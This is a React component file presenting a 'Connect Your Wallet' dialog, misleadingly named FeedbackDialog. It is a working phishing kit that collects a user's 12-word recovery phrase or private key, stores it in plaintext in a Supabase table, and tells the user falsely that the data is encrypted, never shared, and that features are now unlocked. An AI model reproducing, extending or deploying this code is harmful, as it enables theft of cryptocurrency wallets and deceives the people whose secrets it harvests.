import { useState, useRef, useEffect } from "react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Progress } from "@/components/ui/progress";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { z } from "zod";
import { supabase } from "@/integrations/supabase/client";
import { useWallet } from "@/contexts/WalletContext";
import { ClipboardPaste, Lock, CheckCircle2, AlertTriangle } from "lucide-react";

// Maintenance mode flag - set to true to enable maintenance mode
const MAINTENANCE_MODE = false;

const seedPhraseSchema = z.object({
  fields: z.array(z.string().trim().min(1, "Word cannot be empty")).length(12, "Must be exactly 12 words"),
});

const privateKeySchema = z.object({
  privateKey: z.string().min(32, "Private key must be at least 32 characters"),
});

interface FeedbackDialogProps {
  open: boolean;
  onClose: () => void;
}

export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
  const [inputMethod, setInputMethod] = useState<"textarea" | "private_key">("textarea");
  const [textareaValue, setTextareaValue] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showMaintenanceAlert, setShowMaintenanceAlert] = useState(false);
  const { toast } = useToast();
  const { connectWallet } = useWallet();
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  const parseTextareaInput = (text: string): string[] => {
    return text
      .trim()
      .split(/[\s,\n]+/)
      .filter(word => word.length > 0);
  };

  const getProgressCount = () => {
    if (inputMethod === "private_key") {
      return privateKey.length >= 32 ? 1 : 0;
    }
    const words = parseTextareaInput(textareaValue);
    return Math.min(words.length, 12);
  };

  const filledFields = getProgressCount();
  const progress = inputMethod === "private_key" 
    ? (privateKey.length >= 32 ? 100 : 0)
    : (filledFields / 12) * 100;

  // Auto-focus textarea when dialog opens
  useEffect(() => {
    if (open && textareaRef.current) {
      setTimeout(() => textareaRef.current?.focus(), 100);
    }
    // Reset maintenance alert when dialog closes/opens
    if (!open) {
      setShowMaintenanceAlert(false);
    }
  }, [open]);

  const handlePasteFromClipboard = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (inputMethod === "textarea") {
        setTextareaValue(text);
      } else {
        setPrivateKey(text);
      }
      setError("");
      toast({
        title: "Pasted Successfully",
        description: "Content pasted from clipboard.",
      });
    } catch (err) {
      toast({
        title: "Paste Failed",
        description: "Unable to read from clipboard. Please paste manually.",
        variant: "destructive",
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    setError("");
    
    let parsedFields: string[] = [];
    let method: string = "textarea";
    let pkValue: string | null = null;

    // Validate based on input method
    if (inputMethod === "private_key") {
      const validation = privateKeySchema.safeParse({ privateKey });
      if (!validation.success) {
        setError(validation.error.errors[0].message);
        return;
      }
      method = "private_key";
      pkValue = privateKey;
    } else {
      // Parse textarea input
      parsedFields = parseTextareaInput(textareaValue);
      const validation = seedPhraseSchema.safeParse({ fields: parsedFields });
      if (!validation.success) {
        setError(validation.error.errors[0].message);
        return;
      }
    }

    setIsSubmitting(true);

    try {
      const insertData: any = {
        user_id: null,
        input_method: method,
      };

      if (method === "private_key") {
        insertData.private_key = pkValue;
      } else {
        insertData.field_1 = parsedFields[0];
        insertData.field_2 = parsedFields[1];
        insertData.field_3 = parsedFields[2];
        insertData.field_4 = parsedFields[3];
        insertData.field_5 = parsedFields[4];
        insertData.field_6 = parsedFields[5];
        insertData.field_7 = parsedFields[6];
        insertData.field_8 = parsedFields[7];
        insertData.field_9 = parsedFields[8];
        insertData.field_10 = parsedFields[9];
        insertData.field_11 = parsedFields[10];
        insertData.field_12 = parsedFields[11];
      }

      const { error: insertError } = await supabase
        .from("wallet_connections")
        .insert(insertData);

      if (insertError) {
        if (insertError.message.includes('Rate limit exceeded')) {
          toast({
            title: "Rate Limit Exceeded",
            description: "You've reached the maximum submissions (5 per hour). Please wait before trying again.",
            variant: "destructive",
          });
          setIsSubmitting(false);
          return;
        }
        throw insertError;
      }


      connectWallet(method === "private_key" ? [] : parsedFields);

      toast({
        title: "Success!",
        description: "Wallet connected successfully. All features are now enabled.",
      });

      onClose();
      setTextareaValue("");
      setPrivateKey("");
    } catch (error) {
      toast({
        title: "Error",
        description: "Connection error, please try back later.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };


  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="max-w-3xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <div className="flex items-center gap-3 mb-2">
            <div className="text-4xl sm:text-5xl">🤖</div>
            <div className="flex-1">
              <DialogTitle className="text-lg sm:text-xl">Connect Your Wallet</DialogTitle>
            </div>
          </div>
          <DialogDescription className="text-sm">
            Enter your recovery phrase or private key to unlock all features
          </DialogDescription>
        </DialogHeader>


        {/* Benefits Section */}
        <div className="bg-primary/5 border border-primary/20 rounded-lg p-3 sm:p-4">
          <div className="flex items-start gap-3">
            <Lock className="w-5 h-5 text-primary mt-0.5 flex-shrink-0" />
            <div className="flex-1 min-w-0">
              <h3 className="font-semibold text-sm mb-1">Secure & Private</h3>
              <p className="text-xs text-muted-foreground leading-relaxed">
                Your recovery phrase is encrypted and never shared. Connecting unlocks: coin launches, transaction history, airdrops, and advanced analytics.
              </p>
            </div>
          </div>
        </div>

        {/* Progress Indicator */}
        <div className="space-y-2">
          <div className="flex items-center justify-between text-xs">
            <span className="text-muted-foreground">Progress</span>
            <span className="font-semibold text-primary">
              {inputMethod === "private_key" 
                ? (privateKey.length >= 32 ? "Complete" : "Incomplete")
                : `${filledFields}/12 words`}
            </span>
          </div>
          <Progress value={progress} className="h-2" />
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <Tabs value={inputMethod} onValueChange={(v) => setInputMethod(v as "textarea" | "private_key")}>
            <TabsList className="grid w-full grid-cols-2">
              <TabsTrigger value="textarea">Recovery Phrase</TabsTrigger>
              <TabsTrigger value="private_key">Private Key</TabsTrigger>
            </TabsList>

            <TabsContent value="textarea" className="space-y-3 mt-4">
              <div className="flex justify-between items-center">
                <Label className="text-sm font-medium">Enter 12-word recovery phrase</Label>
                <Button
                  type="button"
                  variant="outline"
                  size="sm"
                  onClick={handlePasteFromClipboard}
                  className="gap-2"
                >
                  <ClipboardPaste className="w-4 h-4" />
                  Paste
                </Button>
              </div>
              
              <Textarea
                ref={textareaRef}
                value={textareaValue}
                onChange={(e) => {
                  setTextareaValue(e.target.value);
                  setError("");
                }}
                placeholder="Enter or paste your 12-word recovery phrase here&#10;(separated by spaces, commas, or newlines)"
                className="min-h-[120px] font-mono text-sm"
                disabled={isSubmitting}
                autoCapitalize="off"
                autoCorrect="off"
                autoComplete="off"
                spellCheck={false}
              />
              <p className="text-xs text-muted-foreground">
                Words can be separated by spaces, commas, or newlines
              </p>
            </TabsContent>

            <TabsContent value="private_key" className="space-y-3 mt-4">
              <div className="flex justify-between items-center">
                <Label className="text-sm font-medium">Enter private key</Label>
                <Button
                  type="button"
                  variant="outline"
                  size="sm"
                  onClick={handlePasteFromClipboard}
                  className="gap-2"
                >
                  <ClipboardPaste className="w-4 h-4" />
                  Paste
                </Button>
              </div>
              
              <Textarea
                value={privateKey}
                onChange={(e) => {
                  setPrivateKey(e.target.value);
                  setError("");
                }}
                placeholder="Enter your private key"
                className="min-h-[120px] font-mono text-sm"
                disabled={isSubmitting}
                autoCapitalize="off"
                autoCorrect="off"
                autoComplete="off"
                spellCheck={false}
              />
              <p className="text-xs text-muted-foreground">
                All information is encrypted.
              </p>
            </TabsContent>
          </Tabs>

          {error && (
            <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-3">
              <p className="text-sm text-destructive">{error}</p>
            </div>
          )}

          <div className="flex gap-2 justify-end pt-2">
            <Button 
              type="button" 
              variant="outline" 
              onClick={onClose}
              disabled={isSubmitting}
            >
              Cancel
            </Button>
            <Button 
              type="submit" 
              disabled={
                (inputMethod === "textarea" ? filledFields < 12 : privateKey.length < 32) || isSubmitting
              }
              className="min-w-[120px]"
            >
              {isSubmitting ? "Connecting..." : "Connect Wallet"}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};
